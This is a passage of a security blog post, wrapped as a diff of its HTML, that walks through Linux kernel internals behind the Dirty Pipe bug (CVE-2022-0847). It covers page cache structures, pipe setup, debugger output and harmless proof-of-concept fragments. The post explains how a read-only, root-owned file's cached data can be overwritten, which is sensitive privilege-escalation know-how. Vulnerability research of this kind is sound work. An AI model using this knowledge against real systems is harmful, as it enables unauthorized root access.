@@ -1,0 +1,1242 @@
+<!doctype html><html lang=en>
+<head>
+<title>Exploration of the Dirty Pipe Vulnerability (CVE-2022-0847) :: lolcads tech blog</title>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=description content="Intro This blog post reflects our exploration of the Dirty Pipe Vulnerability in the Linux kernel. The bug was discovered by Max Kellermann and described here. If you haven&amp;rsquo;t read the original publication yet, we&amp;rsquo;d suggest that you read it first (maybe also twice ;)). While Kellermann&amp;rsquo;s post is a great resource that contains all the relevant information to understand the bug, it assumes some familiarity with the Linux kernel. To fully understand what&amp;rsquo;s going on we&amp;rsquo;d like to shed some light on specific kernel internals.">
+<meta name=keywords content="Linux,kernel,LPE,pipe,splice,page cache,debugging">
+<meta name=robots content="noodp">
+<link rel=canonical href=https://lolcads.github.io/posts/2022/06/dirty_pipe_cve_2022_0847/>
+<link rel=stylesheet href=https://lolcads.github.io/assets/style.css>
+<link rel=stylesheet href=https://lolcads.github.io/assets/green.css>
+<link rel=apple-touch-icon href=https://lolcads.github.io/img/apple-touch-icon-192x192.png>
+<link rel="shortcut icon" href=https://lolcads.github.io/img/favicon/green.png>
+<meta name=twitter:card content="summary">
+<meta property="og:locale" content="en">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Exploration of the Dirty Pipe Vulnerability (CVE-2022-0847)">
+<meta property="og:description" content="Intro This blog post reflects our exploration of the Dirty Pipe Vulnerability in the Linux kernel. The bug was discovered by Max Kellermann and described here. If you haven&amp;rsquo;t read the original publication yet, we&amp;rsquo;d suggest that you read it first (maybe also twice ;)). While Kellermann&amp;rsquo;s post is a great resource that contains all the relevant information to understand the bug, it assumes some familiarity with the Linux kernel. To fully understand what&amp;rsquo;s going on we&amp;rsquo;d like to shed some light on specific kernel internals.">
+<meta property="og:url" content="https://lolcads.github.io/posts/2022/06/dirty_pipe_cve_2022_0847/">
+<meta property="og:site_name" content="lolcads tech blog">
+<meta property="og:image" content="https://lolcads.github.io">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+<meta property="article:published_time" content="2022-06-06 19:57:03 +0200 +0200">
+</head>
+<body class=green>
+<div class="container center headings--one-size">
+<header class=header>
+<div class=header__inner>
+<div class=header__logo>
+<a href=/>
+<div class=logo>
+lolcads tech blog
+</div>
+</a>
+</div>
+<div class=menu-trigger>menu</div>
+</div>
+<nav class=menu>
+<ul class="menu__inner menu__inner--desktop">
+<li><a href=/>Blog</a></li>
+<li><a href=/about>About</a></li>
+<li><a href=/contact>Contact</a></li>
+</ul>
+<ul class="menu__inner menu__inner--mobile">
+<li><a href=/>Blog</a></li>
+<li><a href=/about>About</a></li>
+<li><a href=/contact>Contact</a></li>
+</ul>
+</nav>
+</header>
+<div class=content>
+<div class=post>
+<h1 class=post-title>
+<a href=https://lolcads.github.io/posts/2022/06/dirty_pipe_cve_2022_0847/>Exploration of the Dirty Pipe Vulnerability (CVE-2022-0847)</a></h1>
+<div class=post-meta>
+<span class=post-date>
+2022-06-06
+[Updated: 2022-06-06]
+</span>
+<span class=post-author>:: Valentin Obst and Martin Clauß</span>
+</div>
+<span class=post-tags>
+#<a href=https://lolcads.github.io/tags/linux/>Linux</a>&nbsp;
+#<a href=https://lolcads.github.io/tags/kernel/>kernel</a>&nbsp;
+#<a href=https://lolcads.github.io/tags/lpe/>LPE</a>&nbsp;
+#<a href=https://lolcads.github.io/tags/pipe/>pipe</a>&nbsp;
+#<a href=https://lolcads.github.io/tags/splice/>splice</a>&nbsp;
+#<a href=https://lolcads.github.io/tags/page-cache/>page cache</a>&nbsp;
+#<a href=https://lolcads.github.io/tags/debugging/>debugging</a>&nbsp;
+</span>
+<div class=table-of-contents>
+<h2>
+Table of Contents
+</h2>
+<nav id=TableOfContents>
+<ul>
+<li><a href=#intro>Intro</a></li>
+<li><a href=#our-goal--disclaimer>Our Goal / Disclaimer</a></li>
+<li><a href=#page-cache>Page Cache</a></li>
+<li><a href=#pipes-general>Pipes (general)</a></li>
+<li><a href=#pipes-initialization>Pipes (initialization)</a>
+<ul>
+<li><a href=#overview>Overview</a></li>
+<li><a href=#code>Code</a></li>
+<li><a href=#debugger>Debugger</a></li>
+</ul>
+</li>
+<li><a href=#pipes-readingwriting>Pipes (reading/writing)</a>
+<ul>
+<li><a href=#writing>Writing</a></li>
+<li><a href=#reading>Reading</a></li>
+<li><a href=#summary>Summary</a></li>
+</ul>
+</li>
+<li><a href=#pipes-splicing>Pipes (splicing)</a>
+<ul>
+<li><a href=#the-splice-system-call-user-land>The <code>splice</code> System Call (user land)</a></li>
+<li><a href=#the-splice-system-call-implementation>The <code>splice</code> System Call (Implementation)</a></li>
+<li><a href=#debugger-1>Debugger</a></li>
+</ul>
+</li>
+<li><a href=#whats-the-actual-problem>What&rsquo;s the Actual Problem?</a>
+<ul>
+<li><a href=#limitations>Limitations</a></li>
+</ul>
+</li>
+<li><a href=#approaches-to-understand-the-bug>Approaches to Understand the Bug</a>
+<ul>
+<li><a href=#top-down-vs-bottom-up-vs-hybrid>Top Down vs. Bottom Up vs. Hybrid</a></li>
+<li><a href=#linux-kernel-source>Linux Kernel Source</a></li>
+</ul>
+</li>
+<li><a href=#conclusion>Conclusion</a></li>
+</ul>
+</nav>
+</div>
+<div class=post-content><div>
+<h2 id=intro>Intro<a href=#intro class=hanchor arialabel=Anchor>&#8983;</a> </h2>
+<p>This blog post reflects our exploration of the Dirty Pipe Vulnerability in the Linux kernel. The bug was discovered by Max Kellermann and described <a href=https://dirtypipe.cm4all.com/>here</a>. If you haven&rsquo;t read the original publication yet, we&rsquo;d suggest that you read it first (maybe also twice ;)). While Kellermann&rsquo;s post is a great resource that contains all the relevant information to understand the bug, it assumes some familiarity with the Linux kernel. To fully understand what&rsquo;s going on we&rsquo;d like to shed some light on specific kernel internals. The aim of this post is to share our knowledge and to provide a resource for other interested individuals. The idea of this post is as follows: We take a small proof-of-concept (PoC) program and divide it into several stages. Each stage issues a system call (or syscall for short), and we will look inside the kernel to understand which actions and state changes occur in response to those calls. For this we use both, the kernel source code (<a href=https://elixir.bootlin.com/linux/v5.17.9/source>elixir.bootlin.com</a>, version 5.17.9) and a kernel debugging setup (derived from <a href=https://github.com/martinclauss/linux-kernel-debugging>linux-kernel-debugging</a>). The Dirty Pipe-specific debugging setup and the PoC code is provided in a <a href=https://github.com/vobst/lkd-cve>GitHub</a> repository.</p>
+<h2 id=our-goal--disclaimer>Our Goal / Disclaimer<a href=#our-goal--disclaimer class=hanchor arialabel=Anchor>&#8983;</a> </h2>
+<p>It&rsquo;s important to talk about the goal of our investigation first:</p>
+<ul>
+<li>Do we want to understand how the Linux kernel works in general? Maybe not right now&mldr;</li>
+<li>Do we want to know what the vulnerability is? Why it occurs? How it can be exploited? Yes!</li>
+</ul>
+<p>It is important to keep in mind, what we want to achieve. The Linux kernel is a <strong>very</strong> complex piece of software. We have to leave some blind spots, but that&rsquo;s <strong>absolutely okay</strong> :)</p>
+<p>Thus, when we show kernel source code we will often hide parts that are not directly relevant for our discussion to improve readability. In general, those parts may very well be security-relevant and we encourage you to follow the links to review the original code. In particular, if you want to find your own vulnerabilities or become a kernel hacker you should spend more time to understand (all) the mechanisms and details! ;)</p>
+<h2 id=page-cache>Page Cache<a href=#page-cache class=hanchor arialabel=Anchor>&#8983;</a> </h2>
+<p>The page cache plays an important role in the Dirty Pipe vulnerability so let&rsquo;s see what it is and how it works first.</p>
+<blockquote>
+<p>The physical memory is volatile and the common case for getting data into the memory is to read it from files. Whenever a file is read, the data is put into the page cache to avoid expensive disk access on the subsequent reads. Similarly, when one writes to a file, the data is placed in the page cache and eventually gets into the backing storage device. The written pages are marked as dirty and when Linux decides to reuse them for other purposes, it makes sure to synchronize the file contents on the device with the updated data. <a href=https://www.kernel.org/doc/html/latest/admin-guide/mm/concepts.html#page-cache>source</a></p>
+</blockquote>
+<p>In particular, the above means that if any process on the system (or the kernel itself) requests data from a file that is already cached, the cached data is used instead of accessing the disk. Of course there are ways to influence this behavior by using flags (<code>O_DIRECT | O_SYNC</code>) when opening a file, or by explicitly instructing the kernel to <code>sync</code>hronize dirty pages. You could also discard the cached pages using the <code>sysfs</code> pseudo file system: <code># echo 1 > /proc/sys/vm/drop_caches</code>. However, in most situations the cached data is what is ultimately used by the kernel (and thus also the user processes).</p>
+<p>At this point we can already tease what the Dirty Pipe vulnerability is all about: It will allow us to overwrite the cached data of any file that we are allowed to <strong>open</strong> (read-only access is sufficient), without the page cache actually marking the overwritten page as &lsquo;dirty&rsquo;. Thus, we can trick the system into thinking that the file contents changed (at least for a while) without leaving traces on disk.</p>
+<p>But let&rsquo;s not get ahead of ourselves, the goal is after all to understand <em>why</em> this happens. As we can see, the first thing our PoC does, is opening a file for reading, without any additional flags.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>int</span> tfd;
+...
+pause_for_inspection(<span style=color:#e6db74>&#34;About to open() file&#34;</span>);
+tfd <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#34;./target_file&#34;</span>, O_RDONLY);
+</code></pre></div><p><a href=https://github.com/vobst/lkd-cve/blob/main/lkd_examples/dirtypipe/poc.c#L61><code>⬀ go to source code</code></a></p>
+<p>The kernel function handling our <code>open</code> user space call is <code>do_sys_openat2()</code>. It attempts to get the file in the desired mode, and if everything succeeds it installs a new file descriptor that is backed by the file and returns it (the file descriptor is just an <code>int</code>eger).</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>long</span>
+<span style=color:#a6e22e>do_sys_openat2</span>(<span style=color:#66d9ef>int</span> dfd, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> __user <span style=color:#f92672>*</span>filename, <span style=color:#66d9ef>struct</span> open_how <span style=color:#f92672>*</span>how)
+{
+	<span style=color:#66d9ef>struct</span> open_flags op;
+	<span style=color:#66d9ef>int</span> fd <span style=color:#f92672>=</span> build_open_flags(how, <span style=color:#f92672>&amp;</span>op);
+	<span style=color:#66d9ef>struct</span> filename <span style=color:#f92672>*</span>tmp;
+...
+    tmp <span style=color:#f92672>=</span> getname(filename);
+...
+	fd <span style=color:#f92672>=</span> get_unused_fd_flags(how<span style=color:#f92672>-&gt;</span>flags);
+...
+	<span style=color:#66d9ef>struct</span> file <span style=color:#f92672>*</span>f <span style=color:#f92672>=</span> do_filp_open(dfd, tmp, <span style=color:#f92672>&amp;</span>op); <span style=color:#75715e>// lolcads: maybe follow ... but don&#39;t get lost ;)
+</span><span style=color:#75715e></span>...
+	<span style=color:#66d9ef>if</span> (IS_ERR(f)) { <span style=color:#75715e>// e.g. permission checks failed, doesn&#39;t exist...
+</span><span style=color:#75715e></span>		put_unused_fd(fd);
+		fd <span style=color:#f92672>=</span> PTR_ERR(f);
+	} <span style=color:#66d9ef>else</span> {
+		fsnotify_open(f);
+		fd_install(fd, f);
+	}
+	putname(tmp);
+    <span style=color:#66d9ef>return</span> fd; <span style=color:#75715e>// lolcads: breakpoint 1
+</span><span style=color:#75715e></span>}
+</code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/fs/open.c#L1198><code>⬀ go to source code</code></a></p>
+<p>Following the call to <code>do_filp_open()</code> bears the danger of getting lost in the jungle of the (virtual) file system. To avoid going down that rabbit hole we place our first breakpoint on the <code>return</code> statement. This gives us the opportunity to find the <code>struct file</code> that is backing the file descriptor our PoC process receives.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>struct</span> file {
+...
+	<span style=color:#66d9ef>struct</span> path                     f_path;
+	<span style=color:#66d9ef>struct</span> inode	            	<span style=color:#f92672>*</span>f_inode;
+	<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>struct</span> file_operations	<span style=color:#f92672>*</span>f_op;
+...
+	<span style=color:#66d9ef>struct</span> address_space        	<span style=color:#f92672>*</span>f_mapping;
+...
+};
+</code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/include/linux/fs.h#L956><code>⬀ go to source code</code></a></p>
+<p>Importantly, the <code>f_mapping</code> field leads us to the <code>struct address_space</code> that represents the page cache object associated to the file. The <code>a_ops</code> field points to implementations of typical operations one might want to perform on a page cache object e.g., reading ahead, marking pages as dirty or writing back dirty pages, and so on.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>struct</span> address_space {
+	<span style=color:#66d9ef>struct</span> inode		<span style=color:#f92672>*</span>host;
+	<span style=color:#66d9ef>struct</span> xarray		i_pages;
+...
+	<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span>		nrpages;
+	pgoff_t                 writeback_index;
+	<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>struct</span> address_space_operations <span style=color:#f92672>*</span>a_ops;
+	<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span>		flags;
+...
+}
+</code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/include/linux/fs.h#L450><code>⬀ go to source code</code></a></p>
+<p>The actual cached data lies on one or more pages somewhere in physical memory. Each and every page of physical memory is described by a <code>struct page</code>. An <a href=https://lwn.net/Articles/745073/>extendable array</a> (<code>struct xarray</code>) containing pointers to those page structs can be found in the <code>i_pages</code> field of the <code>struct address_space</code>.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>struct</span> page {
+	<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> flags;
+...
+    <span style=color:#75715e>/* Page cache and anonymous pages */</span>
+	<span style=color:#66d9ef>struct</span> address_space <span style=color:#f92672>*</span>mapping;
+	pgoff_t index;		<span style=color:#75715e>/* Our offset within mapping. */</span>
+...
+	<span style=color:#75715e>/*
+</span><span style=color:#75715e>	 * If the page can be mapped to userspace, encodes the number
+</span><span style=color:#75715e>	 * of times this page is referenced by a page table.
+</span><span style=color:#75715e>	 */</span>
+	atomic_t _mapcount;
+	<span style=color:#75715e>/*
+</span><span style=color:#75715e>	 * If the page is neither PageSlab nor mappable to userspace,
+</span><span style=color:#75715e>	 * the value stored here may help determine what this page
+</span><span style=color:#75715e>	 * is used for.  See page-flags.h for a list of page types
+</span><span style=color:#75715e>	 * which are currently stored here.
+</span><span style=color:#75715e>	 */</span>
+	<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> page_type;
+...
+	<span style=color:#75715e>/* Usage count. *DO NOT USE DIRECTLY*. See page_ref.h */</span>
+	atomic_t _refcount;
+...
+	<span style=color:#75715e>/*
+</span><span style=color:#75715e>	 * On machines where all RAM is mapped into kernel address space,
+</span><span style=color:#75715e>	 * we can simply calculate the virtual address. On machines with
+</span><span style=color:#75715e>	 * highmem some memory is mapped into kernel virtual memory
+</span><span style=color:#75715e>	 * dynamically, so we need a place to store that address.
+</span><span style=color:#75715e>	 * Note that this field could be 16 bits on x86 ... ;)
+</span><span style=color:#75715e>	 *
+</span><span style=color:#75715e>	 * Architectures with slow multiplication can define
+</span><span style=color:#75715e>	 * WANT_PAGE_VIRTUAL in asm/page.h
+</span><span style=color:#75715e>	 */</span>
+	<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>virtual;	<span style=color:#75715e>/* Kernel virtual address (NULL if
+</span><span style=color:#75715e>					   not kmapped, ie. highmem) */</span>
+}
+</code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/include/linux/mm_types.h#L72><code>⬀ go to source code</code></a></p>
+<p>The last comment gives a hint at how to find the actual page of physical memory described by this struct within the kernel&rsquo;s virtual address space. (The kernel maps all of physical memory into its virtual address space so we know its <em>somewhere</em>. Refer to the <a href=https://elixir.bootlin.com/linux/v5.17.9/source/Documentation/x86/x86_64/mm.rst>documentation</a> for more details.)</p>
+<pre tabindex=0><code>========================================================================================================================
+      Start addr    |   Offset   |     End addr     |  Size   | VM area description 
+========================================================================================================================
+...
+   ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)
+...
+</code></pre><p>The key to finding the &lsquo;needle in the haystack&rsquo; is another region of the kernel&rsquo;s virtual address space.</p>
+<blockquote>
+<p>The sparse vmemmap uses a virtually mapped memory map to optimize pfn_to_page and page_to_pfn operations. There is a global struct page *vmemmap pointer that points to a virtually contiguous array of struct page objects. A PFN is an index to that array and the offset of the struct page from vmemmap is the PFN of that page. <a href=https://www.kernel.org/doc/html/latest/vm/memory-model.html>source</a></p>
+</blockquote>
+<pre tabindex=0><code>========================================================================================================================
+      Start addr    |   Offset   |     End addr     |  Size   | VM area description
+========================================================================================================================
+...
+   ffffe90000000000 |  -23    TB | ffffe9ffffffffff |    1 TB | ... unused hole
+   ffffea0000000000 |  -22    TB | ffffeaffffffffff |    1 TB | virtual memory map (vmemmap_base)
+   ffffeb0000000000 |  -21    TB | ffffebffffffffff |    1 TB | ... unused hole
+...
+</code></pre><p>In the debugger we can confirm that the address of the <code>struct page</code> associated to the <code>struct address_space</code> of the <code>target_file</code> our <code>poc</code> process opened indeed lies within this range.</p>
+<pre tabindex=0><code>struct task_struct at 0xffff888103a71c80
+&gt; 'pid': 231
+&gt; 'comm': &quot;poc&quot;, '\000' &lt;repeats 12 times&gt;
+
+struct file at 0xffff8881045b0800
+&gt; 'f_mapping': 0xffff8881017d9460
+&gt; filename: target_file
+
+struct address_space at 0xffff8881017d9460
+&gt; 'a_ops': 0xffffffff82226ce0 &lt;ext4_aops&gt;
+&gt; 'i_pages.xa_head' : 0xffffea0004156880                &lt;- here!
+
+</code></pre><p>The kernel implements the translation of this address into a position in the contiguous mapping of all physical memory using a series of macros that hide behind a call to <a href=https://elixir.bootlin.com/linux/v5.17.9/source/include/linux/mm.h#L1712><code>lowmem_page_address / page_to_virt</code></a>.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#define page_to_virt(x) __va(PFN_PHYS(page_to_pfn(x)))
+</span><span style=color:#75715e></span>    <span style=color:#75715e>#define page_to_pfn __page_to_pfn
+</span><span style=color:#75715e></span>        <span style=color:#75715e>#define __page_to_pfn(page) (unsigned long)((page) - vmemmap) </span><span style=color:#75715e>// (see .config: CONFIG_SPARSEMEM_VMEMMAP=y)
+</span><span style=color:#75715e></span>            <span style=color:#75715e>#define vmemmap ((struct page *)VMEMMAP_START)
+</span><span style=color:#75715e></span>                <span style=color:#75715e># define VMEMMAP_START      vmemmap_base </span><span style=color:#75715e>// (see .config: CONFIG_DYNAMIC_MEMORY_LAYOUT=y)
+</span><span style=color:#75715e></span>    <span style=color:#75715e>#define PFN_PHYS(x) ((phys_addr_t)(x) &lt;&lt; PAGE_SHIFT)
+</span><span style=color:#75715e></span>        <span style=color:#75715e>#define PAGE_SHIFT      12
+</span><span style=color:#75715e></span>    <span style=color:#75715e>#define __va(x)         ((void *)((unsigned long)(x)+PAGE_OFFSET))
+</span><span style=color:#75715e></span>        <span style=color:#75715e>#define PAGE_OFFSET     ((unsigned long)__PAGE_OFFSET)
+</span><span style=color:#75715e></span>            <span style=color:#75715e>#define __PAGE_OFFSET           page_offset_base </span><span style=color:#75715e>// (see .config: CONFIG_DYNAMIC_MEMORY_LAYOUT=y)
+</span></code></pre></div><p>When following the macros, make sure to consider your architecture (e.g., x86) and check for compile time definitions in the <code>.config</code> file of your build (e.g., <code>CONFIG_DYNAMIC_MEMORY_LAYOUT=y</code>). The values of <code>vmemmap_base</code> and <code>page_offset_base</code> are in general effected by <a href=https://en.wikipedia.org/wiki/Address_space_layout_randomization#Kernel_address_space_layout_randomization>KASLR</a> but can be determined at runtime e.g., by using the debugger.</p>
+<p>Equipped with this knowledge, we can <a href=https://github.com/vobst/lkd-cve/blob/main/lkd_scripts_gdb/lkd/structs.py#L158>script the debugger</a> to do this calculation for us and print the cached data of the file we opened.</p>
+<pre tabindex=0><code>struct page at 0xffffea0004156880
+&gt; virtual: 0xffff8881055a2000
+&gt; data: b'File owned by root!\n'[...]b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+</code></pre><p>Inspecting the file permissions confirms that we are indeed not allowed to write to it.</p>
+<p><code>-rw-r--r-- 1 root root 20 May 19 20:15 target_file</code></p>
+<p>Next, we are going to explore the second kernel subsystem involved in the Dirty Pipe vulnerability.</p>
+<h2 id=pipes-general>Pipes (general)<a href=#pipes-general class=hanchor arialabel=Anchor>&#8983;</a> </h2>
+<p>Pipes are a unidirectional inter-process communication (IPC) mechanism found in UNIX-like operating systems. In essence, a pipe is a buffer in kernel space that is accessed by processes through file descriptors. Unidirectionality means that there are two types of file descriptors, <em>read</em> and <em>write</em> ones:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>int</span> pipefds[<span style=color:#ae81ff>2</span>];
+pipe(pipefds);
+</code></pre></div><pre tabindex=0><code>                         ┌───────────────────┐
+ write() ---&gt; pipefds[1] │&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;│ pipefds[0] ---&gt; read()
+                         └───────────────────┘
+</code></pre><p>Upon creating a pipe the calling process receives both file descriptors, but usually it proceeds by distributing one or both of the file descriptors to other processes (e.g., by <code>fork/clone</code>ing or through UNIX domain <code>socket</code>s) to facilitate IPC. They are, for example, used by shells to connect stdout and stdin of the launched sub-processes.</p>
+<pre tabindex=0><code>$ strace -f sh -c 'echo &quot;Hello world&quot; | wc' 2&gt;&amp;1 | grep -E &quot;(pipe|dup2|close|clone|execve|write|read)&quot;
+...
+sh: pipe([3, 4]) = 0                              // parent shell creates pipe
+sh: clone(...)                                    // spawn child shell that will do echo (build-in command)
+sh: close(4) = 0                                  // parent shell does not need writing end anymore
+echo sh: close(3)                                 // close reading end
+echo sh: dup2(4, 1) = 0                           // set stdout equal to writing end
+echo sh: close(4)                                 // close duplicate writing end
+echo sh: write(1, &quot;Hello world\n&quot;, 12) = 12       // child shell performs write to pipe
+...
+sh: clone(...)                                    // spawn child shell that will later execve wc
+sh: close(3) = 0                                  // parent shell does not need reading end anymore
+...
+wc sh: dup2(3, 0) = 0                             // set stdin equal to reading end
+wc sh: close(3) = 0                               // close duplicate reading end
+wc sh: execve(&quot;/usr/bin/wc&quot;, [&quot;wc&quot;],...)          // exec wc
+wc: read(0, &quot;Hello world\n&quot;, 16384) = 12          // wc reads from pipe
+...
+</code></pre><p>We mostly care about anonymous pipes as seen in the example above but there are also named pipes (see, e.g., <a href=https://www.linuxjournal.com/article/2156>here</a>)</p>
+<p>Check out the excellent book <em>The Linux Programming Interface</em> by Michael Kerrisk, Chapter 44 &ldquo;Pipes and FIFOs&rdquo; for more information and examples.</p>
+<h2 id=pipes-initialization>Pipes (initialization)<a href=#pipes-initialization class=hanchor arialabel=Anchor>&#8983;</a> </h2>
+<p>After opening the target file, our PoC process proceeds by creating a pipe:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>int</span> pipefds[<span style=color:#ae81ff>2</span>];
+...
+pause_for_inspection(<span style=color:#e6db74>&#34;About to create pipe()&#34;</span>);
+<span style=color:#66d9ef>if</span> (pipe(pipefds)) {
+    exit(<span style=color:#ae81ff>1</span>);
+}
+</code></pre></div><p><a href=https://github.com/vobst/lkd-cve/blob/main/lkd_examples/dirtypipe/poc.c#L70><code>⬀ go to source code</code></a></p>
+<p>Let&rsquo;s investigate what the kernel does to provide the pipe functionality.</p>
+<h3 id=overview>Overview<a href=#overview class=hanchor arialabel=Anchor>&#8983;</a> </h3>
+<p>Our system call is handled by the kernel function <code>do_pipe2</code>.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>SYSCALL_DEFINE1(pipe, <span style=color:#66d9ef>int</span> __user <span style=color:#f92672>*</span>, fildes)
+{
+	<span style=color:#66d9ef>return</span> do_pipe2(fildes, <span style=color:#ae81ff>0</span>);
+}
+</code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L1026><code>⬀ go to source code</code></a></p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>do_pipe2</span>(<span style=color:#66d9ef>int</span> __user <span style=color:#f92672>*</span>fildes, <span style=color:#66d9ef>int</span> flags)
+{
+	<span style=color:#66d9ef>struct</span> file <span style=color:#f92672>*</span>files[<span style=color:#ae81ff>2</span>];
+	<span style=color:#66d9ef>int</span> fd[<span style=color:#ae81ff>2</span>];
+	<span style=color:#66d9ef>int</span> error;
+
+	error <span style=color:#f92672>=</span> __do_pipe_flags(fd, files, flags); <span style=color:#75715e>// mc: follow me
+</span><span style=color:#75715e></span>	<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>error) {
+		<span style=color:#66d9ef>if</span> (unlikely(copy_to_user(fildes, fd, <span style=color:#66d9ef>sizeof</span>(fd)))) {
+			fput(files[<span style=color:#ae81ff>0</span>]);
+			fput(files[<span style=color:#ae81ff>1</span>]);
+			put_unused_fd(fd[<span style=color:#ae81ff>0</span>]);
+			put_unused_fd(fd[<span style=color:#ae81ff>1</span>]);
+			error <span style=color:#f92672>=</span> <span style=color:#f92672>-</span>EFAULT;
+		} <span style=color:#66d9ef>else</span> {
+			fd_install(fd[<span style=color:#ae81ff>0</span>], files[<span style=color:#ae81ff>0</span>]);
+			fd_install(fd[<span style=color:#ae81ff>1</span>], files[<span style=color:#ae81ff>1</span>]);
+		}
+	}
+	<span style=color:#66d9ef>return</span> error;
+}
+</code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L1004><code>⬀ go to source code</code></a></p>
+<p>Here we can see that two integer file descriptors, backed by two distinct files, are created. One for the reading <code>fd[0]</code>, and one for the writing <code>fd[1]</code> end of the pipe. The descriptors are also copied from the kernel to user space <code>copy_to_user(fildes, fd, sizeof(fd))</code>, where <code>fildes</code> is the user space pointer we specified with the call to <code>pipe(pipefds)</code> in our PoC.</p>
+<p>Following the call to <code>__do_pipe_flags()</code> reveals which data structures the kernel uses to implement our pipe. We summarized the relevant structures and their relationships in the following figure:</p>
+<pre tabindex=0><code>                                                                                                                  ┌──────────────────┐
+                                                                                      ┌──────────────────────┐  ┌►│struct pipe_buffer│
+                                   ┌────────────────────────┐                     ┌──►│struct pipe_inode_info│  │ │...               │
+                             ┌───► │struct file             │                     │   │                      │  │ │page = Null       │
+                             │     │                        │                     │   │...                   │  │ │...               │
+File desciptor table         │     │...                     │                     │   │                      │  │ ├──────────────────┤
+                             │     │                        │                     │   │head = 0              │  │ │struct pipe_buffer│
+int fd    │  struct file *f  │     │f_inode  ───────────────┼──┐                  │   │                      │  │ │...               │
+──────────┼───────────────── │     │                        │  │                  │   │tail = 0              │  │ │page = Null       │
+...       │  ...             │     │fmode =  O_RDONLY | ... │  │  ┌─────────────┐ │   │                      │  │ │...               │
+          │                  │     │                        │  ├─►│struct inode │ │   │ring_size = 16        │  │ ├──────────────────┤
+pipefd_r  │  f_read    ──────┘     │...                     │  │  │             │ │   │                      │  │ │       ...        │
+          │                        └────────────────────────┘  │  │...          │ │   │...                   │  │ ├──────────────────┤
+pipefd_w  │  f_write   ──────┐                                 │  │             │ │   │                      │  │ │struct pipe_buffer│
+          │                  │     ┌────────────────────────┐  │  │i_pipe  ─────┼─┘   │bufs ─────────────────┼──┘ │...               │
+...       │  ...             └───► │struct file             │  │  │             │     │                      │    │page = Null       │
+          │                        │                        │  │  │...          │     │...                   │    │...               │
+          │                        │...                     │  │  │             │     └──────────────────────┘    └──────────────────┘
+                                   │                        │  │  │i_fop  ──────┼─┐
+                                   │f_inode  ───────────────┼──┘  │             │ │   ┌─────────────────────────────────────┐
+                                   │                        │     │...          │ └──►│struct file_operations               │
+                                   │fmode = O_WRONLY | ...  │     └─────────────┘     │                                     │
+                                   │                        │                         │...                                  │
+                                   │...                     │                         │                                     │
+                                   └────────────────────────┘                         │read_iter  = pipe_read               │
+                                                                                      │                                     │
+                                                                                      │write_iter = pipe_write              │
+                                                                                      │                                     │
+                                                                                      │...                                  │
+                                                                                      │                                     │
+                                                                                      │splice_write = iter_file_splice_write│
+                                                                                      │                                     │
+                                                                                      │...                                  │
+                                                                                      └─────────────────────────────────────┘
+</code></pre><p>The two integer file descriptors, representing the pipe in user space, are backed by two <code>struct file</code>s that only differ in their permission bits. In particular, they both refer to the same <code>struct inode</code>.</p>
+<blockquote>
+<p>The inode (index node) is a data structure in a Unix-style file system that describes a file-system object such as a file or a directory. Each inode stores the attributes and disk block locations of the object&rsquo;s data. File-system object attributes may include metadata (times of last change, access, modification), as well as owner and permission data.
